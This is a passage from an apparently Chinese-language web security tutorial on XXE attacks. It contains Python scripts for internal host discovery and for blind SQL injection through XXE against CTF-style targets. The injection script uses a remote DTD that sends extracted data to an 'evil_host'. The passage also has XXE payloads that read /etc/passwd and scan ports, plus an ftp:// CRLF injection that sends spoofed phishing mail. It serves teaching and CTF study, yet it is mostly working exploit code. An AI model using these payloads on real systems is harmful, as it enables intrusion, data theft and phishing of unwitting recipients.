</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Origtional XML that the server accepts</span>
</span></span><span class=line><span class=cl><span class=c1>#&lt;xml&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#    &lt;stuff&gt;user&lt;/stuff&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#&lt;/xml&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_xml</span><span class=p>(</span><span class=n>string</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=n>xml</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=n>xml</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;&lt;!ENTITY xxe SYSTEM &#34;&#34;&#34;</span> <span class=o>+</span> <span class=s1>&#39;&#34;&#39;</span> <span class=o>+</span> <span class=n>string</span> <span class=o>+</span> <span class=s1>&#39;&#34;&#39;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;&gt;]&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=n>xml</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;&lt;xml&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=n>xml</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=n>xml</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;&#34;&lt;/xml&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>send_xml</span><span class=p>(</span><span class=n>xml</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_xml</span><span class=p>(</span><span class=n>xml</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/xml&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>xml</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=n>coded_string</span> <span class=o>=</span> <span class=n>x</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=c1># a little split to get only the base64 encoded value</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>coded_string</span>
</span></span><span class=line><span class=cl><span class=c1>#   print base64.b64decode(coded_string)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>255</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ip</span> <span class=o>=</span> <span class=s1>&#39;10.0.0.&#39;</span> <span class=o>+</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>        <span class=n>string</span> <span class=o>=</span> <span class=s1>&#39;php://filter/convert.base64-encode/resource=http://&#39;</span> <span class=o>+</span> <span class=n>ip</span> <span class=o>+</span> <span class=s1>&#39;/&#39;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=n>string</span>
</span></span><span class=line><span class=cl>        <span class=n>build_xml</span><span class=p>(</span><span class=n>string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=k>continue</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=实验四http-内网主机端口扫描>实验四：HTTP 内网主机端口扫描<a hidden class=anchor aria-hidden=true href=#实验四http-内网主机端口扫描>#</a></h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p><p><strong>比如我们传入：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;  
</span></span><span class=line><span class=cl>&lt;!DOCTYPE data SYSTEM &#34;http://127.0.0.1:515/&#34; [  
</span></span><span class=line><span class=cl>&lt;!ELEMENT data (#PCDATA)&gt;  
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl>&lt;data&gt;4&lt;/data&gt;
</span></span></code></pre></td></tr></table></div></div><p><strong>返回结果：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>javax.xml.bind.UnmarshalException  
</span></span><span class=line><span class=cl> - with linked exception:
</span></span><span class=line><span class=cl>[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
</span></span><span class=line><span class=cl>Exception Description: An error occurred unmarshalling the document  
</span></span><span class=line><span class=cl>Internal Exception: ████████████████████████: Connection refused
</span></span></code></pre></td></tr></table></div></div><p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测，设置替换参数为端口即可</p><h3 id=实验五内网盲注ctf>实验五：内网盲注(CTF)<a hidden class=anchor aria-hidden=true href=#实验五内网盲注ctf>#</a></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p><p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=mi>52</span><span class=n>dandan</span><span class=o>.</span><span class=n>cc</span><span class=o>/</span><span class=n>public_html</span><span class=o>/</span><span class=n>config</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><p>拿到第一部分 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=nx>BASEDIR</span><span class=p>,</span> <span class=s2>&#34;/var/www/52dandan.club/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=nx>FLAG_SIG</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=nx>SECRETFILE</span><span class=p>,</span><span class=s1>&#39;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>....</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p><strong>注意：</strong></p><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php
过滤器的一个压缩的方法</p><p>压缩：echo file_get_contents(&ldquo;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&rdquo;);
解压：echo file_get_contents(&ldquo;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&rdquo;);</p></blockquote><p>然后我们考虑内网有没有东西，我们读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/proc/net/arp
</span></span><span class=line><span class=cl>/etc/host
</span></span></code></pre></td></tr></table></div></div><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p><p><strong>示例代码：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://39.107.33.75:33899/common.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;evil_man&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;testabcdefg@gmail.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;comment&#34;</span><span class=p>:</span><span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                &lt;!DOCTYPE root [
</span></span></span><span class=line><span class=cl><span class=s2>                &lt;!ENTITY </span><span class=si>% d</span><span class=s2>td SYSTEM &#34;http://evil_host/evil.dtd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                </span><span class=si>%d</span><span class=s2>td;]&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>28</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span><span class=mi>123</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./evil.dtd&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>payload2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;&lt;!ENTITY </span><span class=si>% f</span><span class=s2>ile SYSTEM &#34;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&#39;-(case</span><span class=si>%a</span><span class=s2>0when((select</span><span class=si>%a</span><span class=s2>0group_concat(total)</span><span class=si>%a</span><span class=s2>0from</span><span class=si>%a</span><span class=s2>0albert_shop)like</span><span class=si>%a</span><span class=s2>0binary(&#39;</span><span class=si>{}</span><span class=s2>&#39;))then(0)else(1)end)-&#39;1&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                &lt;!ENTITY </span><span class=si>% a</span><span class=s2>ll &#34;&lt;!ENTITY </span><span class=si>% s</span><span class=s2>end SYSTEM &#39;http://evil_host/?result=</span><span class=si>%f</span><span class=s2>ile;&#39;&gt;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                </span><span class=si>%a</span><span class=s2>ll;
</span></span></span><span class=line><span class=cl><span class=s2>                </span><span class=si>%s</span><span class=s2>end;&#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=s1>&#39;_&#39;</span><span class=o>*</span><span class=n>i</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;_&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>27</span><span class=o>-</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span> <span class=s1>&#39;test </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;Oti3a3LeLPdkPkqKF84xs=&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span> <span class=ow>and</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span><span class=o>!=</span><span class=s1>&#39;_&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span> <span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>result</span>
</span></span></code></pre></td></tr></table></div></div><p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p><h3 id=实验六钓鱼>实验六：钓鱼：<a hidden class=anchor aria-hidden=true href=#实验六钓鱼>#</a></h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><p><strong>示例代码：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp://a%0D%0A
</span></span><span class=line><span class=cl>EHLO%20a%0D%0A
</span></span><span class=line><span class=cl>MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
</span></span><span class=line><span class=cl>RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
</span></span><span class=line><span class=cl>DATA%0D%0A
</span></span><span class=line><span class=cl>From%3A%20support%40VULNERABLESYSTEM.com%0A
</span></span><span class=line><span class=cl>To%3A%20victim%40gmail.com%0A
</span></span><span class=line><span class=cl>Subject%3A%20test%0A
</span></span><span class=line><span class=cl>%0A
</span></span><span class=line><span class=cl>test!%0A
</span></span><span class=line><span class=cl>%0D%0A
</span></span><span class=line><span class=cl>.%0D%0A
</span></span><span class=line><span class=cl>QUIT%0D%0A
</span></span><span class=line><span class=cl>:a@VULNERABLESYSTEM.com:25
</span></span></code></pre></td></tr></table></div></div><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><p><strong>示例代码：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp://a
</span></span><span class=line><span class=cl>EHLO a
</span></span><span class=line><span class=cl>MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;
</span></span><span class=line><span class=cl>RCPT TO: &lt;victim@gmail.com&gt;
</span></span><span class=line><span class=cl>DATA
</span></span><span class=line><span class=cl>From: support@VULNERABLESYSTEM.com
</span></span><span class=line><span class=cl>To: victim@gmail.com
</span></span><span class=line><span class=cl>Subject: Reset your password
</span></span><span class=line><span class=cl>We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>QUIT
</span></span><span class=line><span class=cl>:support@VULNERABLESYSTEM.com:25
</span></span></code></pre></td></tr></table></div></div><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h2 id=真实的-xxe-出现在哪>真实的 XXE 出现在哪<a hidden class=anchor aria-hidden=true href=#真实的-xxe-出现在哪>#</a></h2><p>我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</p><p>如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）</p><p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</p><h3 id=实例一模拟情况>实例一：模拟情况<a hidden class=anchor aria-hidden=true href=#实例一模拟情况>#</a></h3><p><strong>示例代码：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /vulnerable HTTP/1.1
</span></span><span class=line><span class=cl>Host: www.test.com
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Referer: https://test.com/test.html
</span></span><span class=line><span class=cl>Content-Type: application/xml
</span></span><span class=line><span class=cl>Content-Length: 294
</span></span><span class=line><span class=cl>Cookie: mycookie=cookies;
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;catalog&gt;
</span></span><span class=line><span class=cl>   &lt;core id=&#34;test101&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;author&gt;John, Doe&lt;/author&gt;
</span></span><span class=line><span class=cl>      &lt;title&gt;I love XML&lt;/title&gt;
</span></span><span class=line><span class=cl>      &lt;category&gt;Computers&lt;/category&gt;
</span></span><span class=line><span class=cl>      &lt;price&gt;9.99&lt;/price&gt;
</span></span><span class=line><span class=cl>      &lt;date&gt;2018-10-01&lt;/date&gt;
</span></span><span class=line><span class=cl>      &lt;description&gt;XML is the best!&lt;/description&gt;
</span></span><span class=line><span class=cl>   &lt;/core&gt;
</span></span><span class=line><span class=cl>&lt;/catalog&gt;
</span></span></code></pre></td></tr></table></div></div><p>我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”}</p><p>代表该web服务可以进行xml的类型数据的传输，服务器也会正常接收并处理xml类型。</p><p>此时如果我们传入一个恶意的代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
</span></span><span class=line><span class=cl>&lt;catalog&gt;
</span></span><span class=line><span class=cl>   &lt;core id=&#34;test101&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;author&gt;John, Doe&lt;/author&gt;
</span></span><span class=line><span class=cl>      &lt;title&gt;I love XML&lt;/title&gt;
</span></span><span class=line><span class=cl>      &lt;category&gt;Computers&lt;/category&gt;
</span></span><span class=line><span class=cl>      &lt;price&gt;9.99&lt;/price&gt;
</span></span><span class=line><span class=cl>      &lt;date&gt;2018-10-01&lt;/date&gt;
</span></span><span class=line><span class=cl>      &lt;description&gt;&amp;xxe;&lt;/description&gt;
</span></span><span class=line><span class=cl>   &lt;/core&gt;
</span></span><span class=line><span class=cl>&lt;/catalog&gt;
</span></span></code></pre></td></tr></table></div></div><p>如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;error&#34;: &#34;no results for description root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/bin/sh
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/bin/sh
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync...
</span></span></code></pre></td></tr></table></div></div><h3 id=实例二json-content-type-xxe>实例二：JSON content-type XXE<a hidden class=anchor aria-hidden=true href=#实例二json-content-type-xxe>#</a></h3><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击</p><h4 id=原始请求和响应>原始请求和响应：<a hidden class=anchor aria-hidden=true href=#原始请求和响应>#</a></h4><p><strong>HTTP Request:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /netspi HTTP/1.1
</span></span><span class=line><span class=cl>Host: someserver.netspi.com
</span></span><span class=line><span class=cl>Accept: application/json
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 38
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;search&#34;:&#34;name&#34;,&#34;value&#34;:&#34;netspitest&#34;}
</span></span></code></pre></td></tr></table></div></div><p><strong>HTTP Response:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 43
</span></span><span class=line><span class=cl>
